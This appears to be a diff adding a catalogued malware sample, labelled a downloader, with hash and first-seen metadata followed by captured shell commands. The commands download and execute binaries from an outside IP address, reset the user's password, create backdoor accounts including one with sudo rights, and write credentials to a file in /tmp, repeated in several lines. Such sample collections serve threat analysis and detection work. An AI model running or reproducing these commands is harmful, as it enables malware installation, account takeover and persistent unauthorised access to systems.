@@ -1,0 +1,15 @@
+# sha256: c57140d18566f2315a91660e25e0f17518a25adb1de69d4f0345aff6dfd55358
+# family: downloader
+# kind: script
+# size_bytes: 1488
+# first_seen: 2026-05-31 16:28:58.914891 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+echo 'qwerty' | sudo -S sh -c 'cd /tmp; ulimit -n 1020000; rm -rf meow*; wget http://34.86.81.254/meow; curl -O http://34.86.81.254/meow; chmod 777 meow; ./meow; wget http://34.86.81.254/meowarm64; curl -O http://34.86.81.254/meowarm64; chmod 777 meowarm64; ./meowarm64; echo $(whoami):modzmodz | chpasswd; useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1; useradd -m -s /bin/bash user1; echo user1:modzmodz | chpasswd; echo -n $(whoami):qwerty > /tmp/mew' 2>/dev/null || (cd /tmp; ulimit -n 1020000; rm -rf meow*; wget http://34.86.81.254/meow; curl -O http://34.86.81.254/meow; chmod 777 meow; ./meow; wget http://34.86.81.254/meowarm64; curl -O http://34.86.81.254/meowarm64; chmod 777 meowarm64; ./meowarm64; echo $(whoami):modzmodz | chpasswd; useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1; useradd -m -s /bin/bash user1; echo user1:modzmodz | chpasswd; echo -n $(whoami):qwerty > /tmp/mew)
+whoami
+whoami
+cd /tmp ; ulimit -n 1020000 ; rm -rf meow* ; wget http://34.86.81.254/meow ; curl -O http://34.86.81.254/meow ; chmod 777 meow ; ./meow ; wget http://34.86.81.254/meowarm64 ; curl -O http://34.86.81.254/meowarm64 ; chmod 777 meowarm64 ; ./meowarm64 ; echo $(whoami):modzmodz | chpasswd ; useradd -m -s /bin/bash admin1 ; echo admin1:modzmodz | chpasswd ; usermod -aG sudo admin1 ; useradd -m -s /bin/bash user1 ; echo user1:modzmodz | chpasswd ; echo -n $(whoami):qwerty > /tmp/mew
+whoami
+whoami
